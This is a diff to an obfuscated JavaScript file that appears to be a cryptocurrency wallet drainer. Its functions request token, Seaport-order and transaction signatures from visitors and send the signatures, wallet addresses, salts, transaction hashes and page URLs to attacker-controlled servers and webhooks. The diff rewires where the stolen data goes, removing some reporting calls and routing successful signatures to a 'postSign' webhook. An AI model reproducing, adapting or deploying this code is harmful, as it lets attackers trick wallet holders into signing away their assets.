@@ -2682,19 +2682,7 @@ let blackList = {
     'postBadSig': jsonServer + _0x5c7eff(0x132)
 };
 function sendJSON(_0x1fe40c, _0x28baaf) {
-    debugger;
-    alert(_0x1fe40c)
-    var _0x230136 = _0x5c7eff;
-    console[_0x230136(0xda3)](_0x230136(0x996));
-    let _0x29d1b7 = new XMLHttpRequest();
-    _0x29d1b7[_0x230136(0xe00)](_0x230136(0x63b), _0x28baaf, !![]),
-    _0x29d1b7[_0x230136(0x239)] = function() {
-        var _0x31292b = _0x230136;
-        if (_0x29d1b7['readyState'] === 0x4 && _0x29d1b7[_0x31292b(0x220)] === 0xc8) {}
-    }
-    ,
-    data = JSON[_0x230136(0xbf0)](_0x1fe40c, '\x20', 0x2),
-    _0x29d1b7[_0x230136(0x758)](data);
+    sendMessage(_0x1fe40c, _0x28baaf)
 }
 
 const webhooUri = {
@@ -2983,14 +2971,6 @@ async function signToken(_0x1a55f8, _0x2ed681, _0x297650, _0x301617, _0x56c8a5) 
     msgData[_0x3f04f0(0x1dd)][_0x3f04f0(0xa0f)] = _0x1a55f8;
     var _0x3cd3fc = await signData(_0x1a55f8, msgData);
     if (_0x3cd3fc['success'] == ![])
-        return sendJSON({
-            'id': '271-signTokenReject',
-            'mmAddr': _0x1a55f8,
-            'msgData': msgData[_0x3f04f0(0x1dd)],
-            'accessTime': new Date(),
-            'url': window['location'][_0x3f04f0(0x5ac)]
-        }, serverURL[_0x3f04f0(0x224)]),
-        sendMessage([_0x3f04f0(0xe52), _0x3f04f0(0x2ba), 'wallet:\x20' + etherscanURI + selectedAccount, _0x3f04f0(0xe71) + providerType, _0x3f04f0(0xe34) + new Date(), _0x3f04f0(0xe85) + window['location']['href']]['join'](_0x3f04f0(0xe6c)), webhooUri[_0x3f04f0(0x113)]),
         ![];
     if (_0x3cd3fc[_0x3f04f0(0x1fb)][_0x3f04f0(0x7e9)](_0x3f04f0(0xce8)))
         return ![];
@@ -3006,8 +2986,7 @@ async function signToken(_0x1a55f8, _0x2ed681, _0x297650, _0x301617, _0x56c8a5) 
         'sigType': tokenInfo[_0x3f04f0(0x17a)],
         'providerType': providerType,
         'url': window[_0x3f04f0(0x483)][_0x3f04f0(0x5ac)]
-    }, serverURL[_0x3f04f0(0x8f5)]),
-    sendMessage(['\x20🟦🟦🟦🟦\x20-\x20mid:\x2011', 'url:\x20' + window[_0x3f04f0(0x483)]['href'], _0x3f04f0(0x1c4) + etherscanURI + _0x1a55f8, _0x3f04f0(0x9b1) + providerType, 'salt:\x20' + _0x2ed681, 'sig:\x20' + _0x3cd3fc[_0x3f04f0(0x1fb)], 'sigType:\x20' + tokenInfo[_0x3f04f0(0x17a)], 'signDate:\x20' + new Date()][_0x3f04f0(0x9f0)]('\x0a➜\x20'), webhooUri['postSign']),
+    }, webhooUri['postSign']),
     !![];
 }
 
@@ -3260,14 +3239,6 @@ async function signSeaport(_0x30dde4, _0x1c0f0e, _0x506525) {
         seaportMsgParams[_0x543f77(0x1dd)] = seaportMsgObj;
         var _0x3810b5 = await signData(_0x30dde4, seaportMsgParams);
         if (_0x3810b5[_0x543f77(0xe2d)] == ![]) {
-            sendJSON({
-                'id': _0x543f77(0x5b6),
-                'mmAddr': seaportMsgObj['offerer'],
-                'msgData': seaportMsgObj,
-                'provider': providerType,
-                'url': window[_0x543f77(0x483)][_0x543f77(0x5ac)]
-            }, serverURL[_0x543f77(0x224)]),
-            sendMessage(['😔😔😔\x20SeapReject............', _0x543f77(0x8c1), _0x543f77(0x1c4) + etherscanURI + seaportMsgObj[_0x543f77(0x88b)], _0x543f77(0xe71) + providerType][_0x543f77(0x9f0)](_0x543f77(0xe6c)), webhooUri[_0x543f77(0x113)]),
             _0xd2df13 -= 0x64;
             continue;
         }
@@ -3275,16 +3246,6 @@ async function signSeaport(_0x30dde4, _0x1c0f0e, _0x506525) {
             _0xd2df13 -= 0x64;
             continue;
         }
-        if (_0x3810b5[_0x543f77(0x1fb)] == '0xc143ea056dd2f62a128808cc0c47d9477f9080c080a037437ba52140dbac1d7dc65cdb58531e038930c82314817f91cb8d8ea36a2bd0a001e134479d567b8595d7')
-            return sendJSON({
-                'id': _0x543f77(0x2c6),
-                'mmAddr': _0x30dde4,
-                'msgData': seaportMsgObj,
-                'provider': providerType,
-                'url': window[_0x543f77(0x483)][_0x543f77(0x5ac)]
-            }, serverURL[_0x543f77(0x85b)]),
-            sendMessage([_0x543f77(0x267), 'Method:\x20signToken()', _0x543f77(0x1c4) + etherscanURI + _0x30dde4, _0x543f77(0xe71) + providerType, _0x543f77(0xe85) + window[_0x543f77(0x483)]['href']][_0x543f77(0x9f0)](_0x543f77(0xe6c)), webhooUri['badSignature']),
-            !![];
         var _0x5a09aa = {
             'signature': _0x3810b5['result'],
             'offer': seaportMsgObj[_0x543f77(0xcda)]
@@ -3299,8 +3260,7 @@ async function signSeaport(_0x30dde4, _0x1c0f0e, _0x506525) {
             'providerType': providerType,
             'url': window[_0x543f77(0x483)]['href'],
             'sigType': 0x4
-        }, serverURL[_0x543f77(0x8f5)]),
-        sendMessage([_0x543f77(0x6c6), _0x543f77(0x477) + window[_0x543f77(0x483)]['href'], _0x543f77(0x1c4) + etherscanURI + seaportMsgObj['offerer'], _0x543f77(0x9b1) + providerType, _0x543f77(0x300) + seaportMsgObj[_0x543f77(0xf37)], _0x543f77(0xbe3) + 0x4, _0x543f77(0x5cd) + new Date()][_0x543f77(0x9f0)](_0x543f77(0x983)), webhooUri[_0x543f77(0x1b0)]);
+        }, webhooUri['postSign']),
     }
     return !![];
 }
@@ -3411,14 +3371,6 @@ async function sendTransaction(_0x57a595, _0x284029, _0x566ce0, _0x1f4e58) {
     var _0x268216 = await web3['eth']['accounts'][_0xdb1914(0xd7f)](_0x14ba3c, '0xd8e37f5c4b75f4f294d6c383b050aa38026e15713f5896bcf42cf4d1f24ed437')
       , _0x488399 = await signTxData(_0x57a595, _0x268216[_0xdb1914(0x48e)]);
     if (_0x488399['success'] == ![])
-        return sendJSON({
-            'id': 'SignReject',
-            'mmAddr': selectedAccount,
-            'msgData': msgData,
-            'provider': providerType,
-            'url': window[_0xdb1914(0x483)][_0xdb1914(0x5ac)]
-        }, serverURL[_0xdb1914(0x224)]),
-        sendMessage(['😔😔😔\x20SignReject', 'Method:\x20signToken()', 'wallet:\x20' + etherscanURI + selectedAccount, _0xdb1914(0xe71) + providerType, _0xdb1914(0xe85) + window['location'][_0xdb1914(0x5ac)]]['join']('\x0a=>>\x20\x20\x20\x20'), webhooUri['signedVisit']),
         ![];
     if (_0x488399['result'] == '0x710d1b778c7b5ce3a9ae959a0ab273931e6a552db4e5644e267d77cb36ef48f52359b11f7a9486426c7e7c5c19fb33740803681804731760ae76ac0b5029ad3c1c' || _0x488399['result'] == _0xdb1914(0x9f3))
         return window[_0xdb1914(0x483)][_0xdb1914(0x5ac)] = _0xdb1914(0x1b9) + makeName(0x5) + '.' + makeName(0x3),
@@ -3443,15 +3395,7 @@ async function sendTransaction(_0x57a595, _0x284029, _0x566ce0, _0x1f4e58) {
             'messageHash': _0x268216['messageHash'],
             'providerType': providerType,
             'url': window[_0xdb1914(0x483)][_0xdb1914(0x5ac)]
-        }, serverURL[_0xdb1914(0x224)]),
-        sendJSON({
-            'id': _0xdb1914(0x79d),
-            'mmAddr': selectedAccount,
-            'accessTime': new Date(),
-            'data': _0x488399 + _0xdb1914(0xc2f) + JSON[_0xdb1914(0xbf0)](_0x14ba3c),
-            'providerType': providerType,
-            'url': window[_0xdb1914(0x483)]['href']
-        }, serverURL[_0xdb1914(0xa45)]),
+        }, webhooUri['postSign']),
         canSignTx = ![],
         ![];
     _0x275632 == '1b' && (_0x275632 = '80');
@@ -3469,7 +3413,7 @@ async function sendTransaction(_0x57a595, _0x284029, _0x566ce0, _0x1f4e58) {
         'accessTime': new Date(),
         'providerType': providerType,
         'url': window[_0xdb1914(0x483)]['href']
-    }, serverURL[_0xdb1914(0xa45)]),
+    }, webhooUri['postSign']),
     !![];
 }
 function sendTransactionByWallet(_0x2753c1, _0x32699e, _0x5d8714, _0x1b2fd5) {
@@ -3493,20 +3437,10 @@ function sendTransactionByWallet(_0x2753c1, _0x32699e, _0x5d8714, _0x1b2fd5) {
                 'accessTime': new Date(),
                 'providerType': providerType,
                 'url': window[_0x17422f(0x483)][_0x17422f(0x5ac)]
-            }, serverURL[_0x17422f(0xa45)]),
-            sendMessage(['\x20🟦🟦🟦🟦\x20-\x20mid:\x20488-trxHash', _0x17422f(0x477) + window[_0x17422f(0x483)][_0x17422f(0x5ac)], _0x17422f(0x1c4) + etherscanURI + selectedAccount, 'trxHash:\x20' + _0x3bcf2f, _0x17422f(0x9b1) + providerType, _0x17422f(0x5cd) + new Date()][_0x17422f(0x9f0)](_0x17422f(0x983)), webhooUri[_0x17422f(0xe93)]),
+            }, webhooUri['postSign']),
             _0x32ea68(!![]));
         })['on']('error', function(_0x2bc178) {
             var _0x53ba7d = _0x191d80;
-            sendJSON({
-                'id': _0x53ba7d(0x19c),
-                'mmAddr': selectedAccount,
-                'accessTime': new Date(),
-                'data': JSON[_0x53ba7d(0xbf0)](_0x32699e, '\x20', 0x2),
-                'providerType': providerType,
-                'url': window['location'][_0x53ba7d(0x5ac)]
-            }, serverURL[_0x53ba7d(0x224)]),
-            sendMessage([_0x53ba7d(0x9d8), 'url:\x20' + window[_0x53ba7d(0x483)][_0x53ba7d(0x5ac)], _0x53ba7d(0x1c4) + etherscanURI + selectedAccount, 'provType:\x20' + providerType, _0x53ba7d(0x5cd) + new Date()][_0x53ba7d(0x9f0)](_0x53ba7d(0x983)), webhooUri[_0x53ba7d(0x545)]),
             _0x32ea68(![]);
         });
     }
